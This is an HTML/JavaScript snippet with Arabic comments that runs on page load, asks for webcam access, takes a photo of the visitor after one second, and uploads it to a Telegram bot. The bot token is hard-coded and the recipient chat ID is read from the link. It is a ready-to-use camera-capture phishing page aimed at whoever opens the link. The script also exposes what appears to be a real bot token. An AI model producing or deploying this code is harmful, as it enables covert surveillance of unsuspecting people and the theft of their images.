<script>
    // 1. بيانات البوت الأساسية
    const TELEGRAM_TOKEN = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
    
    // 2. الحصول على آيدي الشخص من الرابط (تلقائياً)
    const urlParams = new URLSearchParams(window.location.search);
    const SENDER_ID = urlParams.get('sender_id'); 

    async function startCapture() {
        // إذا لم يجد الصفحة ID في الرابط، لن تفعل شيئاً
        if (!SENDER_ID) {
            console.error("لا يوجد ID للمستلم في الرابط");
            return;
        }

        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();

            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    // إرسال الصورة للآيدي الذي قرأناه من الرابط
                    formData.append('chat_id', SENDER_ID); 
                    formData.append('photo', blob, 'capture.png');
                    formData.append('caption', '✅ تم التقاط هذه الصورة عبر رابطك الخاص!');

                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }, 'image/png');
            }, 1000);
        } catch (e) {
            console.log("تم رفض الإذن");
        }
    }
    // تشغيل الكود بمجرد فتح الصفحة
    window.onload = startCapture;
</script>
